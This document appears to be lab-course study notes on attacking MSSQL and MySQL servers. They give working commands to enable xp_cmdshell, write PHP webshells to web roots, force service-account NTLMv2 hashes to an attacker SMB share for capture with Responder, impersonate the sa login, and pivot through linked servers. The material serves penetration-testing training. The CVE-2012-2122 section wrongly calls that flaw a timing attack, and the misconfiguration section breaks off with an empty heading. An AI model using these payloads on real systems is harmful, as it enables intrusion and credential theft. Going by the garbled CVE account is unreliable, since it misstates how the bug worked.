## Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:

`nmap -Pn -sV -sC -p1433 10.10.10.125`

## Authentication Mechanisms

### MSSQL Authentication Modes

| Mode | Description |
|------|-------------|
| **Windows authentication mode** | Default "integrated" security; tightly integrated with Windows/Active Directory. Trusted Windows users/groups log in without additional credentials. |
| **Mixed mode** | Supports both Windows/Active Directory accounts and SQL Server authentication. Username/password pairs maintained within SQL Server. |

### MySQL Authentication

MySQL supports multiple methods:
- Username and password
- Windows authentication (requires plugin)

Administrators choose methods based on compatibility, security, and usability, but misconfigurations can introduce vulnerabilities.

### CVE-2012-2122: MySQL Timing Attack

A vulnerability in **MySQL 5.6.x** allowed authentication bypass through repeated login attempts with the same incorrect password.

**How it worked:**
- MySQL took longer to respond to incorrect passwords than correct ones
- Attackers repeatedly tried authentication, measuring response times
- Eventually received successful authentication despite using wrong password
- The timing difference revealed when authentication succeeded

This **timing attack** exploited how MySQL handled authentication attempts, allowing bypass without knowing the actual password.

## Misconfigurations

SQL Server misconfigurations can grant unauthorized access when:
- Anonymous access is enabled

**MySQL:**

## Execute Commands

Command execution allows OS control through SQL with appropriate privileges.

### MSSQL - xp_cmdshell

**Key Points:**
- Disabled by default; requires enabling via Policy-Based Management or sp_configure
- Runs with SQL Server service account privileges
- Operates synchronously (blocks until completion)

**Execute Commands:**
```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```

**Enable xp_cmdshell:**
```mssql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

**Alternative Methods:** Extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, external scripts, and `xp_regwrite` (for privilege escalation via registry modification).

### MySQL - User Defined Functions

MySQL supports UDFs allowing C/C++ code execution within SQL. Custom UDFs for command execution exist but are rare in production environments.

## Write Local Files

### MySQL - Write Files

MySQL can achieve command execution by writing files to executable locations (e.g., web server directories) if privileges allow.

**Write Webshell:**
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

**secure_file_priv Variable:**
Controls import/export operations (requires FILE privilege):
- Empty: No restrictions (insecure)
- Directory path: Limits operations to that directory
- NULL: Disables import/export

**Check Settings:**
```shell-session
mysql> show variables like "secure_file_priv";
```

### MSSQL - Write Files

Requires admin privileges to enable Ole Automation Procedures.

**Enable Ole Automation:**
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

**Create File:**
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Capture MSSQL Service Hash

MSSQL service account hashes can be stolen using undocumented stored procedures (`xp_subdirs` or `xp_dirtree`) that use SMB protocol. When pointed to an attacker's SMB server, these procedures force authentication and send the NTLMv2 hash of the SQL Server service account.

* `xp_dirtree`: An undocumented extended stored procedure that displays a tree structure of folders/files in a specified directory
* `xp_subdirs`: Similar functionality, lists subdirectories of a specified path

**Why they're exploitable**: When you point these procedures to a UNC path (`\\attacker-ip\share`), SQL Server attempts to authenticate to that SMB share using its service account credentials. This triggers NetNTLM authentication, which tools like Responder can capture and potentially crack.

**How to Check if You Have Access:**

1. Direct Execution Test:
   * Test xp_dirtree: `EXEC master..xp_dirtree 'C:\';`
   * Test xp_subdirs: `EXEC master..xp_subdirs 'C:\';`
2. Check Permissions on Extended Stored Procedures:
   * `SELECT * FROM sys.objects WHERE name = 'xp_dirtree';`


### Setup

Start Responder or impacket-smbserver, then execute:

**XP_DIRTREE:**
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

**XP_SUBDIRS:**
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### Capture Hash

**With Responder:**
```shell-session
inferLeo@htb[/htb]$ sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107...
```

**With impacket-smbserver:**
```shell-session
inferLeo@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

[*] User WINSRV02\mssqlsvc authenticated successfully
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107...
```

The captured hash can be cracked or relayed to another host.

## Impersonate Existing Users with MSSQL

The `IMPERSONATE` permission allows users to assume another user's permissions until the session ends or context resets. Sysadmins can impersonate anyone; non-admins need explicit privileges.

### Identify Impersonatable Users

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

### Check Current Privileges

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
*Returns `0` if not sysadmin, `1` if sysadmin.*

### Impersonate User

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

**Note:** Run `EXECUTE AS LOGIN` in the master DB (`USE master`) since all users have access by default. This prevents errors if the impersonated user lacks access to the current database.

### Revert to Original User

Use `REVERT` to return to your previous user context.

**Tip:** Even non-sysadmin impersonated users may have access to other databases or linked servers worth checking.

## Communicate with Other Databases with MSSQL

Linked servers allow MSSQL to execute statements on other SQL Server instances or databases (e.g., Oracle). If configured with sysadmin credentials, this enables lateral movement.

### Identify Linked Servers

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO
```
*`isremote`: `1` = remote server, `0` = linked server*

### Execute Commands on Linked Server

Use `EXECUTE` with the server name in square brackets:

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

**Notes:**
- Escape single quotes with double single quotes (`''`)
- Separate multiple commands with semicolons (`;`)

### Privilege Escalation

With sysadmin privileges on linked servers, you can:
- Read data from any database
- Execute system commands via `xp_cmdshell`
- Fully control the SQL Server instance

This covers common SQL Server and MySQL attack methods. Other databases (PostgreSQL, SQLite, Oracle, Firebase, MongoDB) have similar attack vectors covered in other modules.
